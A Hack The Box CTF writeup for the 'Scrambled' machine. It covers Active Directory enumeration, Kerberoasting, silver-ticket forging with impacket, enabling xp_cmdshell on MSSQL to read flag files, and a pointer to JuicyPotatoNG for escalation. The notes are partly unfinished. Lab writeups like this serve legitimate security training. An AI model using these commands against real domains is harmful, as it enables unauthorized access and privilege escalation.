---
layout: post
title: HTB Machine - Scrambled
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png
share-img: https://www.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png
tags: [ HTB, Hack the Box,Network,Vulnerability Assessment,Active Directory,Source Code Analysis,Reversing,IIS,.NET,Kerberos,WinRM,MSSQL,SMB,DNSPY,Impacket,Python,SQL,C#,Configuration Analysis,Binary Analysis,Password Cracking,Kerberoasting,Kerberos Abuse,Decompilation,Clear Text Credentials,Deserialization,Information Disclosure,Default Credentials,Misconfiguration,Sensitive Data Exposure]
---

Analyzing the nmap we suspect that this could be a domain controller. There is DC name: `commonName=DC1.scrm.local`.Initial enumeration of the smb is not very fruitful. Also little information from the ldap.
```zsh
crackmapexec smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)

whatweb http://10.10.11.168
http://10.10.11.168 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.168], JQuery, Microsoft-IIS[10.0], Script, Title[Scramble Corp Intranet]

smbmap -H 10.10.11.168 -L
[!] Authentication error on 10.10.11.168

smbclient -L 10.10.11.168 -N
session setup failed: NT_STATUS_NOT_SUPPORTED

ldapsearch -x -H ldap://10.10.11.168 -b 'DC=scrm,DC=local'
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

```
when browsing the webpage there is a tab for IT services, a section underneath of it called Contacting IT Support. Inside of it a screenshot shows a user. Since is all we have we can check if the user and password are the same.
```zsh
echo 'ksimpson' > user

/opt/kerbrute/kerbrute bruteuser -d scrm.local --dc 10.10.11.168 user ksimpson

2023/05/24 07:33:33 >  [+] VALID LOGIN:	ksimpson@scrm.local:ksimpson
2023/05/24 07:33:33 >  Done! Tested 1 logins (1 successes) in 0.133 seconds
```
we are going to try a kerberoast attack. 
```zsh

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local

#error and we need to fix? 1:10:09

locate GetUserSPNs.py
/home/rickybana/.local/bin/GetUserSPNs.py
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py
#how we fix the error? link? 
sudo mousepad /usr/share/doc/python3-impacket/examples/GetUserSPNs.py

impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2023-05-24 06:38:46.449044             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2023-05-24 06:38:46.449044             
```

doing a silver ticket atttack

https://codebeautify.org/ntlm-hash-generator

NTML hash generator: B999A16500B87D17EC7F2E2A68778F05

convert to small
```zsh
echo 'B999A16500B87D17EC7F2E2A68778F05' | tr '[A-Z]' '[a-z]'
b999a16500b87d17ec7f2e2a68778f05
```
We are going to need the SID, we can get it with getPac. We could have used ksimpson as a target but we put Admin to get the UserID right away cause it will be needed in the future.
```zsh
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
```
UserId:                          500 
Domain SID: S-1-5-21-2743207045-1827831105-2542523200

```zsh
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local

export KRB5CCNAME=Administrator.ccache

impacket-mssqlclient dc1.scrm.local -k

SP_CONFIGURE "show advanced options", 1

RECONFIGURE

SP_CONFIGURE "xp_cmdshell", 1

RECONFIGURE

xp_cmdshell "whoami"

# we can extract the flags at this point by playing with database queries. 

SELECT * FROM OPENROWSET(BULK N'C:/Users/miscsvc/Desktop/user.txt', SINGLE_CLOB) AS Contents

SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/root.txt', SINGLE_CLOB) AS Contents

# if we want to continue as Pentest and not just as a CTF. We will need to gain a shell from the victim machine.
#  to escalate privileges we can use a juicypotato exploit from antoniococo

https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1

# this will grant us priv access and gain both flags.

# 